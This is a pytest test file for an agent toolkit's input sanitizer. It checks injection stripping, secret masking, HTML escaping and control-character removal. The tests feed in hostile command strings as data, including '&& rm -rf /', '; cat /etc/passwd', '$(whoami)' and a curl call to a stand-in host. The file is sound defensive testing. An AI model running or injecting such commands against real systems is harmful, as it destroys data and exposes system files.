from __future__ import annotations

import pytest

from agent_core.security.sanitizer import Sanitizer


@pytest.fixture
def sanitizer() -> Sanitizer:
    """Default sanitizer (HTML escaping enabled)."""
    return Sanitizer(allow_html=False)


class TestInjectionBlocking:
    """Shell / code injection patterns must be stripped, not merely truncated."""

    @pytest.mark.parametrize(
        "payload",
        [
            "; cat /etc/passwd",
            "| ls -la",
            "$(whoami)",
            "`id`",
            "&& rm -rf /",
            "|| curl http://evil.example",
            "python eval(x)",
            "os.system('rm *')",
        ],
    )
    def test_injection_payload_stripped(self, sanitizer: Sanitizer, payload: str) -> None:
        result = sanitizer.sanitize_string(payload)
        # The dangerous separator/command must not survive sanitization.
        assert "ls -la" not in result
        assert "cat /etc/passwd" not in result
        assert "rm -rf" not in result
        assert "whoami" not in result
        assert "curl http://evil.example" not in result
        # eval( and os.system must be removed entirely.
        assert "eval(" not in result
        assert "os.system" not in result

    def test_pipe_injection_not_surviving(self, sanitizer: Sanitizer) -> None:
        r"""Regression for the ``r"\|\\s*"`` malformed regex bug.

        Previously "| ls -la" was returned unchanged because the raw-string
        pattern matched a literal backslash instead of whitespace.
        """
        assert sanitizer.sanitize_string("| ls -la") == ""
        # A benign prefix before an injection must survive, but the chained
        # command is removed.
        result = sanitizer.sanitize_string("echo hello | ls -la")
        assert "ls" not in result
        assert "hello" in result

    def test_benign_content_preserved(self, sanitizer: Sanitizer) -> None:
        assert sanitizer.sanitize_string("agent_core/file_ops.py") == "agent_core/file_ops.py"
        assert sanitizer.sanitize_string("echo hello") == "echo hello"


class TestSecretMasking:
    def test_api_key_masked(self, sanitizer: Sanitizer) -> None:
        masked = sanitizer.mask_secrets("api_key=sk-abc123def456ghi789")
        assert "****" in masked
        # The secret value tail must not appear unmasked.
        assert "ghi789" not in masked

    def test_password_masked(self, sanitizer: Sanitizer) -> None:
        masked = sanitizer.mask_secrets("password=hunter2")
        assert "****" in masked
        assert "hunter2" not in masked

    def test_bearer_token_masked(self, sanitizer: Sanitizer) -> None:
        masked = sanitizer.mask_secrets("Bearer abc.def.ghi.jkl")
        assert "****" in masked
        assert "jkl" not in masked

    def test_no_secret_passthrough(self, sanitizer: Sanitizer) -> None:
        text = "just a normal sentence with no secrets here"
        assert sanitizer.mask_secrets(text) == text


class TestRecursiveSanitize:
    def test_dict_sanitized(self, sanitizer: Sanitizer) -> None:
        data = {"cmd": "| ls -la", "note": "<x>"}
        result = sanitizer.sanitize(data)
        assert result["cmd"] == ""
        assert "&lt;x&gt;" in result["note"]

    def test_list_sanitized(self, sanitizer: Sanitizer) -> None:
        data = ["&& rm -rf /", "safe text"]
        result = sanitizer.sanitize(data)
        assert result[0] == ""
        assert result[1] == "safe text"

    def test_tuple_sanitized(self, sanitizer: Sanitizer) -> None:
        data = ("$(whoami)", "ok")
        result = sanitizer.sanitize(data)
        assert result[0] == ""
        assert result[1] == "ok"


class TestControlCharsAndHtml:
    def test_control_chars_stripped(self, sanitizer: Sanitizer) -> None:
        text = "hello\x00world\x07bell\nline"
        result = sanitizer.sanitize_string(text)
        assert "\x00" not in result
        assert "\x07" not in result

    def test_html_escaped_by_default(self, sanitizer: Sanitizer) -> None:
        text = "<b>hi</b>"
        result = sanitizer.sanitize_string(text)
        assert "&lt;b&gt;" in result
        assert "&lt;/b&gt;" in result
        # HTML escaping converts angle brackets but preserves inner content.
        assert "hi" in result

    def test_html_preserved_when_allowed(self) -> None:
        s = Sanitizer(allow_html=True)
        text = "<b>hi</b>"
        result = s.sanitize_string(text)
        assert result == "<b>hi</b>"


class TestEdgeCases:
    def test_empty_input_passthrough(self, sanitizer: Sanitizer) -> None:
        assert sanitizer.sanitize_string("") == ""
        assert sanitizer.mask_secrets("") == ""

    def test_non_string_data_unchanged(self, sanitizer: Sanitizer) -> None:
        assert sanitizer.sanitize(42) == 42
        assert sanitizer.sanitize(None) is None

    def test_sanitize_and_mask_combined(self, sanitizer: Sanitizer) -> None:
        data = {"cmd": "| ls", "secret": "api_key=sk-abc123"}
        result = sanitizer.sanitize_and_mask(data)
        assert result["cmd"] == ""
        assert "****" in result["secret"]
        assert "ls" not in result["secret"]


class TestPatternCorrectness:
    """Guard against the specific malformed regex regression."""

    def test_pipe_pattern_matches_whitespace_not_backslash(self, sanitizer: Sanitizer) -> None:
        r"""Regression guard for the ``r"\|\\s*"`` malformed regex bug.

        The old pattern (raw-string ``\\``) matched a literal backslash rather
        than whitespace, so it never fired on real pipe-chained commands and
        "| ls -la" was returned unchanged. Confirm the fixed pattern now strips
        genuine pipe-chained commands while leaving benign trailing pipes alone.
        """
        # The actual failing case from the bug report must be fully stripped.
        assert sanitizer.sanitize_string("| ls -la") == ""
        # A bare trailing pipe with no chained command token is preserved (it
        # carries no executable fragment), proving the pattern targets real
        # commands rather than any stray "|".
        result = sanitizer.sanitize_string("echo hello |")
        assert "hello" in result
